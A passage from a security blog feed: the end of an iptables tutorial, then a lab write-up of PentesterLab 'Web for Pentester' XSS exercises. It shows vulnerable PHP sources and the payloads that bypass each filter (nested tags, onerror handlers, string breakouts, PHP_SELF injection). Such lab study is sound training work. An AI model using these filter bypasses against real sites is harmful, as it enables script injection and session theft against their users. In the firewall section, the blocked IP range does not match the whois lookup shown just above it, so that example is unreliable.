</span><span class='line'>listening on [any] 8000 ...
</span><span class='line'>connect to [192.168.217.137] from (UNKNOWN) [192.168.217.131] 1859
</span><span class='line'>dasa
</span><span class='line'>knock kncok</span></code></pre></td></tr></table></div></figure>


<h3>list rules of a table</h3>

<ul>
<li><code>iptables -L -n -v</code> &ndash; display the rules of the default filter table, also printing the number of packets and bytes processed by each chain, and use numerical format for ports and addresses</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Chain INPUT (policy ACCEPT 172 packets, 21210 bytes)
</span><span class='line'> pkts bytes target     prot opt in     out     source               destination         
</span><span class='line'>
</span><span class='line'>Chain FORWARD (policy ACCEPT 37 packets, 1523 bytes)
</span><span class='line'> pkts bytes target     prot opt in     out     source               destination         
</span><span class='line'>
</span><span class='line'>Chain OUTPUT (policy ACCEPT 82 packets, 6554 bytes)
</span><span class='line'> pkts bytes target     prot opt in     out     source               destination   </span></code></pre></td></tr></table></div></figure>


<h3>flush all the rules</h3>

<ul>
<li><code>iptables -F</code> &ndash; delete your rules and start anew</li>
</ul>


<h3>save rules to survive reboots</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>service iptables save
</span><span class='line'>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]</span></code></pre></td></tr></table></div></figure>


<h3>block specific IP</h3>

<ul>
<li><code>iptables -A INPUT -s 192.168.217.137 -j DROP</code> &ndash; packets from .137 will be dropped</li>
</ul>


<h3>block outgoing connections to a host or range</h3>

<p>Let&rsquo;s imagine that you are tired of your users spending all their day on Twitter. First, find out Twitter&rsquo;s IPs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host twitter.com
</span><span class='line'>twitter.com has address 104.244.42.65
</span><span class='line'>twitter.com has address 104.244.42.1
</span><span class='line'>twitter.com mail is handled by 20 alt1.aspmx.l.google.com.
</span><span class='line'>twitter.com mail is handled by 30 aspmx2.googlemail.com.
</span><span class='line'>twitter.com mail is handled by 20 alt2.aspmx.l.google.com.
</span><span class='line'>twitter.com mail is handled by 10 aspmx.l.google.com.
</span><span class='line'>twitter.com mail is handled by 30 aspmx3.googlemail.com.</span></code></pre></td></tr></table></div></figure>


<p>Next, do a whois lookup on the IP, looking for the CIDR range it belongs to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hois 104.244.42.65 | grep CIDR
</span><span class='line'>CIDR:           104.244.40.0/21</span></code></pre></td></tr></table></div></figure>


<p>Block access to Twitter&rsquo;s IP range: <code>iptables -A OUTPUT -p tcp -d 66.220.144.0/20 -j DROP</code></p>

<h3>log dropped packets</h3>

<ul>
<li><code>iptables -A INPUT -i eth0 -j LOG &mdash;log-prefix &ldquo;Packets dropped by firewall:&rdquo;</code> &ndash; turn on kernel logging for matching packets and prefix the log messages with some text to make them stand out</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#grep "Packets dropped by firewall:" /var/log/messages
</span><span class='line'>May 23 12:11:34 pwnbox kernel: [ 3285.154203] Packets dropped by firewall:IN=eth0 OUT= MAC=00:0c:29:22:f9:ae:00:50:56:ed:cb:c0:08:00 SRC=192.168.217.2 DST=192.168.217.137 LEN=288 TOS=0x00 PREC=0x00 TTL=128 ID=20858 PROTO=UDP SPT=53 DPT=57477 LEN=268
</span><span class='line'>May 23 12:11:34 pwnbox kernel: [ 3285.158231] Packets dropped by firewall:IN=eth0 OUT= MAC=00:0c:29:22:f9:ae:00:50:56:ed:cb:c0:08:00 SRC=192.168.217.2 DST=192.168.217.137 LEN=356 TOS=0x00 PREC=0x00 TTL=128 ID=20859 PROTO=UDP SPT=53 DPT=36464 LEN=336
</span><span class='line'>May 23 12:11:34 pwnbox kernel: [ 3285.162645] Packets dropped by firewall:IN=eth0 OUT= MAC=00:0c:29:22:f9:ae:00:50:56:ed:cb:c0:08:00 SRC=192.168.217.2 DST=192.168.217.137 LEN=360 TOS=0x00 PREC=0x00 TTL=128 ID=20860 PROTO=UDP SPT=53 DPT=47777 LEN=340
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>This post only scratched the tip of the iceberg when it comes to Linux firewalls. The key takeaway should be that iptables is a very powerful utility that can be customized to meet your specific networking needs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>___________________________
</span><span class='line'>&lt; You will wish you hadn't. &gt;
</span><span class='line'> ---------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
    <updated>2017-05-04T06:38:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>

<!-- more -->


<p>Navigating to the VM, we are greeted by this page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/web.png" title="web for pentester" alt="web for pentester"></p>

<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>

<h3>XSS</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xss1.png" title="xss" alt="web for pentester xss 1"></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the most basic type of injection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;there&#39;</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>

<p><strong>Example 2</strong></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>

<p><strong>Example 3</strong></p>

<p>The source looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>place&lt;script&gt;holder</span></code></pre></td></tr></table></div></figure>


<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>place&lt;&lt;script&gt;&gt;holder</span></code></pre></td></tr></table></div></figure>


<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Example 4</strong></p>

<p>Source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;img src='nope' onerror="alert('Got ya')" /&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Example 5</strong></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/alert/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;prompt('Enter pwn code')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Example 6</strong></p>

<p>PHP source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'><span class="x">  </span><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Hello
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">$a</span><span class="o">=</span> <span class="s2">&quot;hacker&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hacker";INJECTION</span></code></pre></td></tr></table></div></figure>


<p>And in the HTML code I saw this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var $a= "hacker";INJECTION";</span></code></pre></td></tr></table></div></figure>


<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hacker";alert("not enough");//</span></code></pre></td></tr></table></div></figure>


<p>And in the source it is rendered the following way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var $a= "hacker";alert("not enough");//";</span></code></pre></td></tr></table></div></figure>


<p><strong>Example 7</strong></p>

<p>PHP code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var $a= 'hacker&quot;;alert(&quot;not enough&quot;);//';</span></code></pre></td></tr></table></div></figure>


<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hacker';alert('still not enough');//</span></code></pre></td></tr></table></div></figure>


<p>And this is translated in the HTML as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var $a= 'hacker';alert('stillnot enough');//';</span></code></pre></td></tr></table></div></figure>


<p><strong>Example8</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xss8.png" title="xss 8" alt="web for pentester xss 8"></p>

<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;HELLO &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>

<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>

<p>Now, we need to take note of how to build the payload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>HELLO hacker<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;/xss/example8.php/hacker&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>My successful injection was:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"</span></code></pre></td></tr></table></div></figure>


<p>And the source now looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;/xss/example8.php/hacker&quot;</span><span class="nt">&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">9000</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>&quot;&quot; method=&quot;POST&quot;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>

<p><strong>Example9</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xss9.png" title="xss 9" alt="dom xss"></p>

<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'>  <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>

<blockquote><p> string.substring(start, end)</p>

<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
Characters start at index 0</p></blockquote>

<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>

<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>

